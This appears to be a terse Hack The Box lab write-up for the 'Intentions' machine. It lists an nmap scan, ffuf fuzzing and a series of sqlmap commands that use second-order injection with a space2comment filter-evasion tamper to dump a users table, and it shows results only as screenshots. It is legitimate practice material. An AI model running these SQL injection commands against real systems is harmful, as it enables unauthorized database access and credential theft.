![image](https://github.com/regarmulia/HTB/assets/33616880/754159fd-e6bd-4e4e-9f52-b7a63d6288b9)```
nmap -sS -sC -sV -T5 -Pn 10.10.11.220
```
![image](https://github.com/regarmulia/HTB/assets/33616880/528dff0c-5310-4215-a2d5-7be40b47e7bd)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://intentions.htb/FUZZ -fs 162 -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7e5bb805-89c5-4842-a466-280fab8a28f3)

```
registration
```
![image](https://github.com/regarmulia/HTB/assets/33616880/3a12ee51-5c45-49b3-8cff-a1730160b60d)


```
sqlmap -r req1.txt --batch
sqlmap -r req2b.txt --batch
```
![image](https://github.com/regarmulia/HTB/assets/33616880/a41968e9-a125-4022-9554-7a2015c569a3)

![image](https://github.com/regarmulia/HTB/assets/33616880/a8183c38-7b4f-423c-8661-ca351f473565)

![image](https://github.com/regarmulia/HTB/assets/33616880/318256aa-4f54-4605-b7d5-2b4add64a990)



```
sqlmap -r req1.txt --second-req=req2.txt --batch --tamper=space2comment
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1a7c8a8c-c45e-4474-86ac-090c34b7db0e)

![image](https://github.com/regarmulia/HTB/assets/33616880/806ea88f-c009-46ad-95b3-92d8e9cd2c79)


```
sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=space2comment --tables
```
![image](https://github.com/regarmulia/HTB/assets/33616880/230307ac-31be-47bc-9385-19d400791dd8)


```
sqlmap -r req1b.txt --second-req=req2b.txt --batch --tamper=space2comment -T users --dump
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0fa022ca-bc8b-4cfb-9d89-05da8947f30d)
